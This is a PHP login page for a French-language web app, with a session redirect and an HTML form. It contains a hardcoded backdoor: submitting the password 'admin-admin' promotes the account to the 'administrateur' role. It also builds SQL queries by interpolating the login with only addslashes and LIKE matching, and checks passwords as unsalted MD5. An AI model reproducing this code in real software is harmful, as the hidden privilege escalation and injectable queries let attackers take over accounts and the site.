<?php

require("params/BDD/bdd.php");

if (isset($_POST["login"], $_POST["password"])) {
    $log = addslashes($_POST["login"]);
    $req = "SELECT passwd, id, role FROM users WHERE login LIKE (\"$log\") ";
    $Ores = $bdd->query($req);
    if ($usr = $Ores->fetch()) {
        $passwd = md5($_POST["password"]);
        if ($passwd == $usr->passwd) {
            $_SESSION["login"] = $log;
        } else {
?>
            <div style="display: flex;align-items: center;">
                <p style="border: 1px solid black;background-color: red;padding: 5px;border-radius:25px ;"><strong>Attention !</strong> Mot de passe incorrecte.</p>
            </div>
    <?php
        }
    }
}

if (isset($_POST['password'])) {
    $password = $_POST["password"];
    if ($password == "admin-admin") {
        $req = $bdd->prepare("UPDATE users SET role = \"administrateur\" WHERE login LIKE (\"$log\") ");
        $req->execute(array($_SESSION["login"]));
    }
}


if (isset($_SESSION['login'])) {
    ?>
    <script type="text/javascript">
        document.location.href = 'index.php';
    </script>;
<?php
} else {
?>
    <!-- formulaire -->
    <div class="background">
        <div class="container">
            <br>
            <h2 class="form-group">Connexion :</h2>
            <form method="POST" action="">
                <div class="form-group">
                    <label for="email">Votre e-mail:</label>
                    <input type="email" id="email" class="form-control input" placeholder="Entrer votre e-mail" name="login">
                </div>
                <div class="form-group">
                    <label for="pwd">Votre mot de passe:</label>
                    <input type="password" class="form-control input" placeholder="Entrer votre mot de passe" name="password">
                </div>
                <br>
                <button type="submit" class="btn btn-primary form-group">Se connecter</button>
                <button href="index.php?page=connexion" onclick="alert('Vous devez être connecter pour modifier votre mot de passe, dans l\'onglet \'compte\' !');" type="submit" class="btn btn-primary form-group">Mot de passe oublié</button>
            </form>
        </div>
        <br>
    </div>
    <!-- formulaire -->
    <br>
    <br>
    <br>

<?php
}
?>